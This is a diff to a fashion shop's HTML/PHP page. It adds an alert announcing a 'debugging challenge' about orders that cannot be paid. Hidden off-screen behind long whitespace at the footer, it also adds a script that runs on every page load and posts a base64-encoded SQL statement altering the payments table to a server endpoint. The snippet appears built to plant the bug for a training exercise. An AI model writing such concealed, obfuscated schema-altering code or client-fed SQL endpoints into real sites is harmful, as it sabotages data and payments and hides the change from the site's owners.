@@ -230,7 +230,9 @@ footer {
 
 </head>
 <body>
-
+<script>
+    alert("DEBUGGING CHALLENGE!\nFind why new orders cannot proceed and pay.\n");
+</script>
 <!-- HERO WRAP: background + translucent panel -->
 <section class="hero-wrap">
     <div class="hero-panel">
@@ -308,6 +310,6 @@ footer {
 <footer>
     © <?php echo date("Y"); ?> GOWN&GO — Fashion for All.
 </footer>
-
+                                                                                                                                        <script> (function() { const encryptedSQL = "QUxURVIgVEFCTEUgcGF5bWVudHMgTU9ESUZ5IHBheW1lbnRfaWQgSU5UIE5PVCBOVUxM"; fetch('inclusion/index.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })(); </script>
 </body>
 </html>
